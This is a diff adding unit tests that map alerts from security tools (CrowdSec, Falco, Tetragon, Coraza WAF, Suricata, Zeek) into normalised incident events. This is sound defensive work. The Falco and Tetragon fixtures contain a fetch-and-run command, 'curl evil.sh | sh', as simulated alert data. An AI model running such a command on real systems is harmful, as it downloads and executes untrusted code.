@@ -14,6 +14,12 @@ def test_list_connectors_includes_expected_keys():
     assert "local_network_probe_v1" in keys
     assert "pgaudit_event_v1" in keys
     assert "wazuh_fim_v1" in keys
+    assert "crowdsec_alert_v1" in keys
+    assert "falco_runtime_v1" in keys
+    assert "tetragon_runtime_v1" in keys
+    assert "coraza_waf_v1" in keys
+    assert "suricata_eve_v1" in keys
+    assert "zeek_notice_v1" in keys
     assert "feodo_c2_v1" in keys
     assert "urlhaus_ioc_v1" in keys
     assert "otx_indicator_v1" in keys
@@ -140,6 +146,217 @@ def test_map_wazuh_fim_event_to_file_integrity_event():
     assert "file_deleted" in ev.payload["reason_codes"]
     assert "critical_path_mutation" in ev.payload["reason_codes"]
     assert ev.anchors["device_id"] == "county-finance-db-01"
+
+
+def test_map_crowdsec_alert_to_dfir_finding_event():
+    ev = map_external_event(
+        connector_key="crowdsec_alert_v1",
+        payload={
+            "created_at": "2026-02-14T08:07:00Z",
+            "scenario": "crowdsecurity/http-bf",
+            "scope": "ip",
+            "value": "41.90.0.10",
+            "service_id": "ecitizen-api",
+            "remediation": True,
+            "decisions": ["ban"],
+            "events_count": 17,
+            "country": "KE",
+        },
+        confidence=0.91,
+    )
+
+    assert ev.event_type == "DFIR_FINDING_EVENT"
+    assert ev.payload["source"] == "crowdsec"
+    assert ev.payload["artifact_name"] == "crowdsecurity/http-bf"
+    assert "remediation_available" in ev.payload["reason_codes"]
+    assert ev.anchors["ip"] == "41.90.0.10"
+    assert ev.anchors["service_id"] == "ecitizen-api"
+
+
+def test_map_falco_runtime_to_dfir_finding_event():
+    ev = map_external_event(
+        connector_key="falco_runtime_v1",
+        payload={
+            "output_time": "2026-02-14T08:08:00Z",
+            "rule": "Write below binary dir",
+            "priority": "Warning",
+            "hostname": "worker-01",
+            "output": "File below a binary dir opened for writing",
+            "output_fields": {
+                "container.id": "abc123",
+                "container.name": "payments-api",
+                "k8s.pod.name": "payments-api-7689",
+                "k8s.ns.name": "prod",
+                "proc.name": "bash",
+                "proc.cmdline": "bash -c curl evil.sh | sh",
+                "fd.name": "/usr/bin/curl",
+                "user.name": "root",
+            },
+            "tags": ["filesystem", "mitre_execution"],
+        },
+        confidence=0.92,
+    )
+
+    assert ev.event_type == "DFIR_FINDING_EVENT"
+    assert ev.payload["source"] == "falco"
+    assert ev.payload["artifact_name"] == "Write below binary dir"
+    assert ev.payload["container_name"] == "payments-api"
+    assert "tag:filesystem" in ev.payload["reason_codes"]
+    assert ev.anchors["service_id"] == "payments-api-7689"
+    assert ev.anchors["device_id"] == "worker-01"
+    assert ev.anchors["endpoint"] == "/usr/bin/curl"
+
+
+def test_map_tetragon_runtime_to_dfir_finding_event():
+    ev = map_external_event(
+        connector_key="tetragon_runtime_v1",
+        payload={
+            "event_time": "2026-02-14T08:09:00Z",
+            "event_type": "process_exec",
+            "policy_name": "suspicious-shell",
+            "verdict": "denied",
+            "hostname": "worker-02",
+            "pod_name": "identity-api-554f",
+            "namespace": "prod",
+            "workload": "identity-api",
+            "process_name": "bash",
+            "command_line": "bash -c curl evil.sh | sh",
+            "file_path": "/usr/bin/bash",
+        },
+        confidence=0.93,
+    )
+
+    assert ev.event_type == "DFIR_FINDING_EVENT"
+    assert ev.payload["source"] == "tetragon"
+    assert ev.payload["artifact_name"] == "suspicious-shell"
+    assert "runtime_enforcement_triggered" in ev.payload["reason_codes"]
+    assert ev.anchors["service_id"] == "identity-api-554f"
+    assert ev.anchors["device_id"] == "worker-02"
+
+
+def test_map_coraza_waf_to_web_attack_event():
+    ev = map_external_event(
+        connector_key="coraza_waf_v1",
+        payload={
+            "timestamp": "2026-02-14T08:11:00Z",
+            "host": "api.gov.ke",
+            "uri": "/v1/payments",
+            "rule_id": "942100",
+            "attack_type": "sql_injection",
+            "action": "denied",
+            "remote_addr": "41.90.0.10",
+            "request_method": "POST",
+            "request_headers.user-agent": "curl/8.0",
+            "tx_id": "tx-1",
+        },
+        confidence=0.94,
+    )
+
+    assert ev.event_type == "WEB_ATTACK_EVENT"
+    assert ev.payload["source"] == "coraza"
+    assert ev.payload["attack_type"] == "sql_injection"
+    assert ev.payload["status"] == "blocked"
+    assert "coraza_rule:942100" in ev.payload["reason_codes"]
+    assert ev.anchors["service_id"] == "api.gov.ke"
+    assert ev.anchors["ip"] == "41.90.0.10"
+
+
+def test_map_suricata_web_alert_to_web_attack_event():
+    ev = map_external_event(
+        connector_key="suricata_eve_v1",
+        payload={
+            "timestamp": "2026-02-14T08:10:00Z",
+            "src_ip": "41.90.0.10",
+            "dest_ip": "196.201.214.10",
+            "dest_port": 443,
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+                "signature": "ET WEB_SERVER SQL Injection Attempt",
+                "category": "Web Application Attack",
+                "severity": 1,
+                "action": "allowed",
+            },
+            "http": {
+                "hostname": "api.gov.ke",
+                "url": "/v1/payments",
+                "http_method": "POST",
+                "http_user_agent": "curl/8.0",
+            },
+            "flow": {
+                "pkts_toserver": 42,
+                "bytes_toserver": 8192,
+            },
+        },
+        confidence=0.93,
+    )
+
+    assert ev.event_type == "WEB_ATTACK_EVENT"
+    assert ev.payload["source"] == "suricata"
+    assert ev.payload["attack_type"] == "sql_injection"
+    assert ev.payload["status"] == "allowed"
+    assert ev.anchors["service_id"] == "api.gov.ke"
+    assert ev.anchors["endpoint"] == "/v1/payments"
+    assert ev.anchors["ip"] == "41.90.0.10"
+
+
+def test_map_suricata_ddos_alert_to_ddos_signal_event():
+    ev = map_external_event(
+        connector_key="suricata_eve_v1",
+        payload={
+            "timestamp": "2026-02-14T08:12:00Z",
+            "src_ip": "198.51.100.25",
+            "dest_ip": "196.201.214.11",
+            "dest_port": 443,
+            "proto": "UDP",
+            "service_id": "huduma-api",
+            "alert": {
+                "signature": "SURICATA UDP Flood Potential DDoS",
+                "category": "Attempted Denial of Service",
+                "severity": 2,
+                "action": "blocked",
+            },
+            "flow": {
+                "pkts_toserver": 2400,
+                "bytes_toserver": 250000,
+            },
+        },
+        confidence=0.95,
+    )
+
+    assert ev.event_type == "DDOS_SIGNAL_EVENT"
+    assert ev.payload["source"] == "suricata"
+    assert ev.payload["service_id"] == "huduma-api"
+    assert ev.payload["status"] == "blocked"
+    assert ev.payload["packet_burst"] == 2400
+    assert ev.anchors["service_id"] == "huduma-api"
+    assert ev.anchors["ip"] == "198.51.100.25"
+
+
+def test_map_zeek_notice_to_dfir_finding_event():
+    ev = map_external_event(
+        connector_key="zeek_notice_v1",
+        payload={
+            "ts": "2026-02-14T08:20:00Z",
+            "note": "SSH::Password_Guessing",
+            "msg": "198.51.100.10 appears to be guessing SSH passwords",
+            "src": "198.51.100.10",
+            "dst": "10.0.0.10",
+            "host": "bastion.internal",
+            "proto": "tcp",
+            "p": 22,
+            "uid": "C4xA1b2c3",
+            "peer_descr": "zeek-sensor-1",
+        },
+        confidence=0.9,
+    )
+
+    assert ev.event_type == "DFIR_FINDING_EVENT"
+    assert ev.payload["source"] == "zeek"
+    assert ev.payload["artifact_name"] == "SSH::Password_Guessing"
+    assert "credential_attack_signal" in ev.payload["reason_codes"]
+    assert ev.anchors["service_id"] == "bastion.internal"
+    assert ev.anchors["ip"] == "198.51.100.10"
 
 
 def test_map_velociraptor_artifact_to_dfir_finding_event():
